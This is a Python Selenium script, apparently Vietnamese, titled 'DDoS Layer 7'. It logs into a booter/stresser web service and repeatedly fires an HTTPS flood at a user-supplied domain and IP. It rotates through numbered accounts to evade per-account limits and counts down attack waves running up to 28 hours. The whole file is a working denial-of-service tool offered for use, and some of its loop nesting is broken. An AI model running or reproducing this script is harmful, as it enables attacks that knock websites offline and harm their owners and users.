from selenium import webdriver
from selenium.webdriver.support.ui import Select
import time
import os,sys
os.system("cls")
print('                         DDoS Layer 7')
time.sleep(3)
os.system("cls")
domain=input("   Nhập Domain: ")
ip=input("   Nhập IP (Nếu Có): ")
user=input("   Tài Khoản: ")
pas=input("   Mật Khẩu: ")
options=webdriver.ChromeOptions()
options.add_argument("--incognito")
options.add_argument("--headless")
options.add_argument("start-maximized")
driver=webdriver.Chrome(options=options)
driver.get('https://cryptostresser.com/login')
time.sleep(1) 
driver.find_element_by_id('username').send_keys(f"{user}1")
time.sleep(1)
driver.find_element_by_id('password').send_keys(f"{pas}")
time.sleep(1)
driver.find_element_by_id('login_button').click()
time.sleep(1)
driver.find_element_by_class_name('user-img-radious-style').click()
time.sleep(2)
driver.find_element_by_link_text('Attack Panel').click()
a=0
while True:
 time.sleep(2)
 driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
 time.sleep(1)
 select = Select(driver.find_element_by_id('attack_methods'))
 select.select_by_visible_text('[FREE] HTTPS (FURY)')
 time.sleep(1)
 driver.find_element_by_id('send_attack_button').click()
 time.sleep(2)
 driver.find_element_by_class_name('swal-button-container').click()
 time.sleep(1)
 driver.find_element_by_class_name('user-img-radious-style').click()
 time.sleep(2)
 driver.find_element_by_link_text('Logout').click()
 time.sleep(1)
 driver.refresh()
 driver.find_element_by_id('username').send_keys(f"{user}2")
 time.sleep(1)
 driver.find_element_by_id('password').send_keys(f"{pas}")
 time.sleep(1)
 driver.find_element_by_id('login_button').click()
 time.sleep(1)
 driver.find_element_by_class_name('user-img-radious-style').click()
 time.sleep(2)
 driver.find_element_by_link_text('Attack Panel').click()
 time.sleep(2)
 driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
 time.sleep(1)
 select = Select(driver.find_element_by_id('attack_methods'))
 select.select_by_visible_text('[FREE] HTTPS (FURY)')
 time.sleep(1)
 driver.find_element_by_id('send_attack_button').click()
 time.sleep(2)
 driver.find_element_by_class_name('swal-button-container').click()
 time.sleep(1)
 driver.find_element_by_class_name('user-img-radious-style').click()
 time.sleep(2)
 driver.find_element_by_link_text('Logout').click()
 time.sleep(2)
 driver.find_element_by_id('username').send_keys(f"{user}1")
 time.sleep(1)
 driver.find_element_by_id('password').send_keys(f"{pas}")
 time.sleep(1)
 driver.find_element_by_id('login_button').click()
 time.sleep(1)
 driver.find_element_by_class_name('user-img-radious-style').click()
 time.sleep(2)
 driver.find_element_by_link_text('Attack Panel').click()
 os.system("cls")
 a=a+1
 for i in range(265,0,-1):
    os.system("cls")
    print(f"4H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {a} Kết Thúc Sau: {i}", end="\r", flush=True)
    time.sleep(1)
 if a == 50:
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Logout').click()
  time.sleep(1)
  driver.refresh()
  driver.find_element_by_id('username').send_keys(f"{user}3")
  time.sleep(1)
  driver.find_element_by_id('password').send_keys(f"{pas}")
  time.sleep(1)
  driver.find_element_by_id('login_button').click()
  time.sleep(1)
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Attack Panel').click()
  b=0
  while True:
   time.sleep(2)
  driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
  time.sleep(1)
  select = Select(driver.find_element_by_id('attack_methods'))
  select.select_by_visible_text('[FREE] HTTPS (FURY)')
  time.sleep(1)
  driver.find_element_by_id('send_attack_button').click()
  time.sleep(2)
  driver.find_element_by_class_name('swal-button-container').click()
  time.sleep(1)
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Logout').click()
  time.sleep(1)
  driver.refresh()
  driver.find_element_by_id('username').send_keys(f"{user}4")
  time.sleep(1)
  driver.find_element_by_id('password').send_keys(f"{pas}")
  time.sleep(1)
  driver.find_element_by_id('login_button').click()
  time.sleep(1)
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Attack Panel').click()
  time.sleep(2)
  driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
  time.sleep(1)
  select = Select(driver.find_element_by_id('attack_methods'))
  select.select_by_visible_text('[FREE] HTTPS (FURY)')
  time.sleep(1)
  driver.find_element_by_id('send_attack_button').click()
  time.sleep(2)
  driver.find_element_by_class_name('swal-button-container').click()
  time.sleep(1)
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Logout').click()
  time.sleep(2)
  driver.find_element_by_id('username').send_keys(f"{user}3")
  time.sleep(1)
  driver.find_element_by_id('password').send_keys(f"{pas}")
  time.sleep(1)
  driver.find_element_by_id('login_button').click()
  time.sleep(1)
  driver.find_element_by_class_name('user-img-radious-style').click()
  time.sleep(2)
  driver.find_element_by_link_text('Attack Panel').click()
  os.system("cls")
  b=b+1
  for i in range(265,0,-1):
     os.system("cls")
     print(f"8H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {b} Kết Thúc Sau: {i}", end="\r", flush=True)
     time.sleep(1)
  if b == 50:
   driver.find_element_by_class_name('user-img-radious-style').click()
   time.sleep(2)
   driver.find_element_by_link_text('Logout').click()
   time.sleep(1)
   driver.refresh()
   driver.find_element_by_id('username').send_keys(f"{user}5")
   time.sleep(1)
   driver.find_element_by_id('password').send_keys(f"{pas}")
   time.sleep(1)
   driver.find_element_by_id('login_button').click()
   time.sleep(1)
   driver.find_element_by_class_name('user-img-radious-style').click()
   time.sleep(2)
   driver.find_element_by_link_text('Attack Panel').click()
   c=0
   while True:
    time.sleep(2)
    driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
    time.sleep(1)
    select = Select(driver.find_element_by_id('attack_methods'))
    select.select_by_visible_text('[FREE] HTTPS (FURY)')
    time.sleep(1)
    driver.find_element_by_id('send_attack_button').click()
    time.sleep(2)
    driver.find_element_by_class_name('swal-button-container').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Logout').click()
    time.sleep(1)
    driver.refresh()
    driver.find_element_by_id('username').send_keys(f"{user}6")
    time.sleep(1)
    driver.find_element_by_id('password').send_keys(f"{pas}")
    time.sleep(1)
    driver.find_element_by_id('login_button').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Attack Panel').click()
    time.sleep(2)
    driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
    time.sleep(1)
    select = Select(driver.find_element_by_id('attack_methods'))
    select.select_by_visible_text('[FREE] HTTPS (FURY)')
    time.sleep(1)
    driver.find_element_by_id('send_attack_button').click()
    time.sleep(2)
    driver.find_element_by_class_name('swal-button-container').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Logout').click()
    time.sleep(2)
    driver.find_element_by_id('username').send_keys(f"{user}5")
    time.sleep(1)
    driver.find_element_by_id('password').send_keys(f"{pas}")
    time.sleep(1)
    driver.find_element_by_id('login_button').click()
    time.sleep(1)
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    driver.find_element_by_link_text('Attack Panel').click()
    os.system("cls")
    c=c+1
    for i in range(265,0,-1):
       os.system("cls")
       print(f"12H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {c} Kết Thúc Sau: {i}", end="\r", flush=True)
       time.sleep(1)
    if c == 50:
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Logout').click()
     time.sleep(1)
     driver.refresh()
     driver.find_element_by_id('username').send_keys(f"{user}7")
     time.sleep(1)
     driver.find_element_by_id('password').send_keys(f"{pas}")
     time.sleep(1)
     driver.find_element_by_id('login_button').click()
     time.sleep(1)
     driver.find_element_by_class_name('user-img-radious-style').click()
     time.sleep(2)
     driver.find_element_by_link_text('Attack Panel').click()
     d=0
     while True:
      time.sleep(2)
      driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
      time.sleep(1)
      select = Select(driver.find_element_by_id('attack_methods'))
      select.select_by_visible_text('[FREE] HTTPS (FURY)')
      time.sleep(1)
      driver.find_element_by_id('send_attack_button').click()
      time.sleep(2)
      driver.find_element_by_class_name('swal-button-container').click()
      time.sleep(1)
      driver.find_element_by_class_name('user-img-radious-style').click()
      time.sleep(2)
      driver.find_element_by_link_text('Logout').click()
      time.sleep(1)
      driver.refresh()
      driver.find_element_by_id('username').send_keys(f"{user}8")
      time.sleep(1)
      driver.find_element_by_id('password').send_keys(f"{pas}")
      time.sleep(1)
      driver.find_element_by_id('login_button').click()
      time.sleep(1)
      driver.find_element_by_class_name('user-img-radious-style').click()
      time.sleep(2)
      driver.find_element_by_link_text('Attack Panel').click()
      time.sleep(2)
      driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
      time.sleep(1)
      select = Select(driver.find_element_by_id('attack_methods'))
      select.select_by_visible_text('[FREE] HTTPS (FURY)')
      time.sleep(1)
      driver.find_element_by_id('send_attack_button').click()
      time.sleep(2)
      driver.find_element_by_class_name('swal-button-container').click()
      time.sleep(1)
      driver.find_element_by_class_name('user-img-radious-style').click()
      time.sleep(2)
      driver.find_element_by_link_text('Logout').click()
      time.sleep(2)
      driver.find_element_by_id('username').send_keys(f"{user}7")
      time.sleep(1)
      driver.find_element_by_id('password').send_keys(f"{pas}")
      time.sleep(1)
      driver.find_element_by_id('login_button').click()
      time.sleep(1)
      driver.find_element_by_class_name('user-img-radious-style').click()
      time.sleep(2)
      driver.find_element_by_link_text('Attack Panel').click()
      os.system("cls")
      d=d+1
      for i in range(265,0,-1):
         os.system("cls")
         print(f"16H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {d} Kết Thúc Sau: {i}", end="\r", flush=True)
         time.sleep(1)
      if d == 50:
       driver.find_element_by_class_name('user-img-radious-style').click()
       time.sleep(2)
       driver.find_element_by_link_text('Logout').click()
       time.sleep(1)
       driver.refresh()
       driver.find_element_by_id('username').send_keys(f"{user}9")
       time.sleep(1)
       driver.find_element_by_id('password').send_keys(f"{pas}")
       time.sleep(1)
       driver.find_element_by_id('login_button').click()
       time.sleep(1)
       driver.find_element_by_class_name('user-img-radious-style').click()
       time.sleep(2)
       driver.find_element_by_link_text('Attack Panel').click()
       e=0
       while True:
        time.sleep(2)
        driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
        time.sleep(1)
        select = Select(driver.find_element_by_id('attack_methods'))
        select.select_by_visible_text('[FREE] HTTPS (FURY)')
        time.sleep(1)
        driver.find_element_by_id('send_attack_button').click()
        time.sleep(2)
        driver.find_element_by_class_name('swal-button-container').click()
        time.sleep(1)
        driver.find_element_by_class_name('user-img-radious-style').click()
        time.sleep(2)
        driver.find_element_by_link_text('Logout').click()
        time.sleep(1)
        driver.refresh()
        driver.find_element_by_id('username').send_keys(f"{user}10")
        time.sleep(1)
        driver.find_element_by_id('password').send_keys(f"{pas}")
        time.sleep(1)
        driver.find_element_by_id('login_button').click()
        time.sleep(1)
        driver.find_element_by_class_name('user-img-radious-style').click()
        time.sleep(2)
        driver.find_element_by_link_text('Attack Panel').click()
        time.sleep(2)
        driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
        time.sleep(1)
        select = Select(driver.find_element_by_id('attack_methods'))
        select.select_by_visible_text('[FREE] HTTPS (FURY)')
        time.sleep(1)
        driver.find_element_by_id('send_attack_button').click()
        time.sleep(2)
        driver.find_element_by_class_name('swal-button-container').click()
        time.sleep(1)
        driver.find_element_by_class_name('user-img-radious-style').click()
        time.sleep(2)
        driver.find_element_by_link_text('Logout').click()
        time.sleep(2)
        driver.find_element_by_id('username').send_keys(f"{user}9")
        time.sleep(1)
        driver.find_element_by_id('password').send_keys(f"{pas}")
        time.sleep(1)
        driver.find_element_by_id('login_button').click()
        time.sleep(1)
        driver.find_element_by_class_name('user-img-radious-style').click()
        time.sleep(2)
        driver.find_element_by_link_text('Attack Panel').click()
        os.system("cls")
        e=e+1
        for i in range(265,0,-1):
           os.system("cls")
           print(f"20H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {e} Kết Thúc Sau: {i}", end="\r", flush=True)
           time.sleep(1)
        if e == 50: 
         driver.find_element_by_class_name('user-img-radious-style').click()
         time.sleep(2)
         driver.find_element_by_link_text('Logout').click()
         time.sleep(1)
         driver.refresh()
         driver.find_element_by_id('username').send_keys(f"{user}11")
         time.sleep(1)
         driver.find_element_by_id('password').send_keys(f"{pas}")
         time.sleep(1)
         driver.find_element_by_id('login_button').click()
         time.sleep(1)
         driver.find_element_by_class_name('user-img-radious-style').click()
         time.sleep(2)
         driver.find_element_by_link_text('Attack Panel').click()
         f=0
         while True:
          time.sleep(2)
          driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
          time.sleep(1)
          select = Select(driver.find_element_by_id('attack_methods'))
          select.select_by_visible_text('[FREE] HTTPS (FURY)')
          time.sleep(1)
          driver.find_element_by_id('send_attack_button').click()
          time.sleep(2)
          driver.find_element_by_class_name('swal-button-container').click()
          time.sleep(1)
          driver.find_element_by_class_name('user-img-radious-style').click()
          time.sleep(2)
          driver.find_element_by_link_text('Logout').click()
          time.sleep(1)
          driver.refresh()
          driver.find_element_by_id('username').send_keys(f"{user}12")
          time.sleep(1)
          driver.find_element_by_id('password').send_keys(f"{pas}")
          time.sleep(1)
          driver.find_element_by_id('login_button').click()
          time.sleep(1)
          driver.find_element_by_class_name('user-img-radious-style').click()
          time.sleep(2)
          driver.find_element_by_link_text('Attack Panel').click()
          time.sleep(2)
          driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
          time.sleep(1)
          select = Select(driver.find_element_by_id('attack_methods'))
          select.select_by_visible_text('[FREE] HTTPS (FURY)')
          time.sleep(1)
          driver.find_element_by_id('send_attack_button').click()
          time.sleep(2)
          driver.find_element_by_class_name('swal-button-container').click()
          time.sleep(1)
          driver.find_element_by_class_name('user-img-radious-style').click()
          time.sleep(2)
          driver.find_element_by_link_text('Logout').click()
          time.sleep(2)
          driver.find_element_by_id('username').send_keys(f"{user}11")
          time.sleep(1)
          driver.find_element_by_id('password').send_keys(f"{pas}")
          time.sleep(1)
          driver.find_element_by_id('login_button').click()
          time.sleep(1)
          driver.find_element_by_class_name('user-img-radious-style').click()
          time.sleep(2)
          driver.find_element_by_link_text('Attack Panel').click()
          os.system("cls")
          f=f+1
          for i in range(265,0,-1):
             os.system("cls")
             print(f"24H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {f} Kết Thúc Sau: {i}", end="\r", flush=True)
             time.sleep(1)
          if f == 50:
           driver.find_element_by_class_name('user-img-radious-style').click()
           time.sleep(2)
           driver.find_element_by_link_text('Logout').click()
           time.sleep(1)
           driver.refresh()
           driver.find_element_by_id('username').send_keys(f"{user}13")
           time.sleep(1)
           driver.find_element_by_id('password').send_keys(f"{pas}")
           time.sleep(1)
           driver.find_element_by_id('login_button').click()
           time.sleep(1)
           driver.find_element_by_class_name('user-img-radious-style').click()
           time.sleep(2)
           driver.find_element_by_link_text('Attack Panel').click()
           g=0
           while True:
            time.sleep(2)
            driver.find_element_by_id('attack_target').send_keys(f"https://{domain}")
            time.sleep(1)
            select = Select(driver.find_element_by_id('attack_methods'))
            select.select_by_visible_text('[FREE] HTTPS (FURY)')
            time.sleep(1)
            driver.find_element_by_id('send_attack_button').click()
            time.sleep(2)
            driver.find_element_by_class_name('swal-button-container').click()
            time.sleep(1)
            driver.find_element_by_class_name('user-img-radious-style').click()
            time.sleep(2)
            driver.find_element_by_link_text('Logout').click()
            time.sleep(1)
            driver.refresh()
            driver.find_element_by_id('username').send_keys(f"{user}14")
            time.sleep(1)
            driver.find_element_by_id('password').send_keys(f"{pas}")
            time.sleep(1)
            driver.find_element_by_id('login_button').click()
            time.sleep(1)
            driver.find_element_by_class_name('user-img-radious-style').click()
            time.sleep(2)
            driver.find_element_by_link_text('Attack Panel').click()
            time.sleep(2)
            driver.find_element_by_id('attack_target').send_keys(f"https://{ip}")
            time.sleep(1)
            select = Select(driver.find_element_by_id('attack_methods'))
            select.select_by_visible_text('[FREE] HTTPS (FURY)')
            time.sleep(1)
            driver.find_element_by_id('send_attack_button').click()
            time.sleep(2)
            driver.find_element_by_class_name('swal-button-container').click()
            time.sleep(1)
            driver.find_element_by_class_name('user-img-radious-style').click()
            time.sleep(2)
            driver.find_element_by_link_text('Logout').click()
            time.sleep(2)
            driver.find_element_by_id('username').send_keys(f"{user}13")
            time.sleep(1)
            driver.find_element_by_id('password').send_keys(f"{pas}")
            time.sleep(1)
            driver.find_element_by_id('login_button').click()
            time.sleep(1)
            driver.find_element_by_class_name('user-img-radious-style').click()
            time.sleep(2)
            driver.find_element_by_link_text('Attack Panel').click()
            os.system("cls")
            g=g+1
            for i in range(265,0,-1):
               os.system("cls")
               print(f"28H Đang Tấn Công Website: {domain}, Đợt Tấn Công Thứ {g} Kết Thúc Sau: {i}", end="\r", flush=True)
               time.sleep(1)
             